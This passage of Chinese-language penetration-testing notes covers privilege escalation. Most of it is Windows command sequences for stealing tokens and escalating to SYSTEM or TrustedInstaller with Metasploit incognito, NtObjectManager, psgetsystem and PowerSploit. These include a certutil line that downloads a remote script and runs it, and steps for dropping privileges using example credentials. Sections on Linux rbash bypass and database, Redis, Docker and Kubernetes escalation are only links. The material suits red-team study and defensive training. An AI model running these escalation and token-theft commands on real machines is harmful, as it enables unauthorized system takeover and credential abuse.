```
提权至 system 权限
```
getsystem
```
指定用户 token 窃取
```
impersonate_token "NT AUTHORITY\SYSTEM"
```
指定进程号窃取
```
steal_token 7376
```
返回之前 token
```
rev2self
或者
drop_token
```
**powershell 版**
NtObjectManager
安装模块
```
Install-Module -Name NtObjectManager
```
提权
```
New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess(Get-NtProcess -Name lsass.exe)
```
卸载模块
```
Uninstall-Module -Name NtObjectManager
```
psgetsystem
```
certutil -urlcache -split -f https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
.\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(666,"c:\windows\system32\cmd.exe","")
将上面命令中的 666 改为任意一个 system 权限的进程的 pid 即可
```
**C++ 实现**
代码地址:   https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6
下载下来之后, 用 vs2019 打开, 文件 -> 从现有代码构建项目 ->Visual C++-> 下一步 -> 选择文件夹, 填写项目名 -> 完成
添加头文件
```c++
#include 
#include 
```
编译即可
找对应进程的 pid
```
ps |findstr lsass
```
提权成 system
```
.\getsystem_parent.exe 944
```
### 提权成 trustedinstaller 组用户
**描述**
在 Windows 系统中，即使获得了管理员权限和 system 权限，也不能修改系统文件
因为 Windows 系统的最高权限为 TrustedInstaller
**相关文章**
- [渗透技巧——Token窃取与利用](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8)
- [The Art of Becoming TrustedInstaller](https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html)
**查看 trustedinstaller 用户**
```
Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner
```
#### 利用TrustedInstaller.exe的token
使用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限
**powershell 版**
先安装 Set-NtTokenPrivilege 命令
https://www.powershellgallery.com/packages/NtObjectManager/1.1.1
```powershell
# Save-Module需要powershell v5.0支持
Save-Module -Name NtObjectManager -Path c:\test
Install-Module -Name NtObjectManager -RequiredVersion 1.1.1
```
```powershell
Set-ExecutionPolicy Unrestricted
Import-Module NtObjectManager
sc.exe start TrustedInstaller
Set-NtTokenPrivilege SeDebugPrivilege
$p = Get-NtProcess -Name TrustedInstaller.exe
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
```
使用 whoami 查看当前 cmd 权限：
```
whoami /groups /fo list
whoami /groups | findstr TrustedInstaller
```
**metasploit 版**
首先回弹一个 meterpreter 的 shell 回来
加载 incognito
```
load incognito
```
提权至 system 权限
```
impersonate_token "NT AUTHORITY\SYSTEM"
```
启动 trustedinstaller 服务
```
shell
sc start trustedinstaller
```
找到进程对应的 pid
```
ps
```
窃取 token
```
steal_token 7376
```
验证是否提权成功
```
shell
whoami /groups
echo aaa > C:Windows\servicing\1.txt
```
**SelectMyParent**
- https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp
```
sc.exe start TrustedInstaller
SelectMyParent.exe cmd.exe 1700
```
**Invoke-TokenManipulation.ps1**
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
```powershell
sc.exe start TrustedInstaller
$id  = Get-Process -name TrustedInstaller* | Select-Object id | ForEach-Object -Process{$_.id}
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId $id
```
### 降权
**描述**
降权通常是指从system权限降到普通用户权限，往往是为了操作当前用户的文件内容（如捕获桌面、操作注册表等）
**相关文章**
- [渗透技巧——程序的降权启动](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8)
**为什么要降权**
- 无法获得当前用户的文件内容
- 环境变量存在差异
    - system权限下，查询到的环境变量APPDATA为`C:\Windows\system32\config\systemprofile\AppData\Roaming`
    - 管理员权限下，查询到的环境变量APPDATA为`C:\Users\a\AppData\Roaming`
- 注册表存在差异
#### 管理员权限降到普通用户权限
**runas**
```
runas /user:test calc.exe
```
这个需要手动输入密码
通过配合 sanur 可以通过管道的方法将密码或者文件中的内容传递给 runas 程序
```
runas /user:test calc.exe | sanur password
```
**lsrunas**
- http://www.verydoc.com/exeshell.html
```
lsrunas.exe /user:test /password:123456 /domain: /command:"calc.exe" /runpath:c:\
```
**CPAU**
- https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/CPAU.exe
```
CPAU.exe -u test -p 123456 -ex "calc.exe" -cwd c:\windows\system32 -lwp
// 必须添加参数-lwp或-lwop，否则无法实现降权
```
**powershell**
```powershell
$uname="test"
$pwd=ConvertTo-SecureString  "123456" -AsPlainText –Force
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)
Start-Process -FilePath  "calc.exe" -Credential $cred
```
#### system权限降到普通用户权限
**SelectMyParent**
- https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp
---
## Linux
**常规提权**
- 参考 [OS-Exploits](../OS安全/OS-Exploits.md#linux) 中的 linux 漏洞部分
**Restricted Bash 绕过**
- 相关文章
    - [Restricted Bash绕过技巧](https://mp.weixin.qq.com/s/bIwKOz1uo-anQyFP0W_j7g)
- 什么是 Restricted Bash
    Restricted Bash(rbash) 又叫做 Restricted Shell，顾名思义就是受限制的 shell。Linux 的 shell 功能强大，以至于整个 Linux 系统可以精准的使用 shell 来控制。在 Linux 不同用户之间，当你执行的一个系统命令时，它可能是危险的不可逆命令，为不同用户之间设定不同权限进行安全管理引入了限制 Bash Shell，防止一些非必要权限用户执行有害系统的高危命令。
    再比如一台 Linux 系统服务器中采用多用户管理，部分用户没有 sudo 权限，但是这些用户可以查看系统目录中大部分内容，虽然没有权限进行编辑但是不希望这些用户查看这些目录，这时可以通过 rbash 在不调整系统上每个文件夹权限的情况下通过限制用户输入某些命令来限制用户随意查看。
    简单来说 rbash 与 shell 的区别就是限制一些行为，让一些命令无法执行。
- rbash 绕过方法
    - 参考 [linux安全](../OS安全/Linux安全.md#lol) 中的 LOL 技巧
---
## Mysql
- [Mysql提权](../软件服务安全/实验/Mysql.md)
---
## MSSQL
- [MSSQL提权](../软件服务安全/实验/MSSQL.md)
---
## PostgreSQL
- [PostgreSQL提权](../软件服务安全/实验/PostgreSQL.md)
---
## Redis
- [Redis](../软件服务安全/实验/Redis.md)
---
## Oracle
- [Oracle](../软件服务安全/实验/Oracle.md)
---
## Docker
- [Docker](../软件服务安全/实验/Docker.md)
---
## Kubernetes
- [Kubernetes](../软件服务安全/实验/Kubernetes.md)